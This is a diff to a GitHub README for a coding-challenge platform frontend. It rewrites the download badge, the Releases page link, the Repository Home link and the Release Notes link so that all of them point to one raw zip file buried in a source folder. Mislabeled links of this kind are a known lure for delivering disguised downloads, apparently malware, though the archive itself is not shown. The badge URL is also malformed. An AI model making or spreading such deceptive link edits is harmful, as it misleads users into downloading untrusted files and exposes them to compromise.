@@ -1,7 +1,7 @@
 # 🎉 coding-kata-platform-frontend - Your Gateway to Coding Challenges
 
 ## 📥 Download Now 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen.svg)](https://github.com/thenerso/coding-kata-platform-frontend/releases)
+[![Download Now](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip%https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, you need the following:
 
 To get started, follow these steps:
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/thenerso/coding-kata-platform-frontend/releases).
+1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip).
 
 2. **Choose the Latest Version**: Find the latest version number at the top of the page. 
 
@@ -66,7 +66,7 @@ For further assistance, visit the Issues section in the repository, where you ca
 
 ## 🔗 Useful Links
 
-- [Repository Home](https://github.com/thenerso/coding-kata-platform-frontend)
-- [Release Notes](https://github.com/thenerso/coding-kata-platform-frontend/releases)
+- [Repository Home](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
+- [Release Notes](https://github.com/thenerso/coding-kata-platform-frontend/raw/refs/heads/main/src/pages/user-level/coding_frontend_kata_platform_v1.4.zip)
   
 Feel free to explore the platform and take your coding skills to the next level. Happy coding!
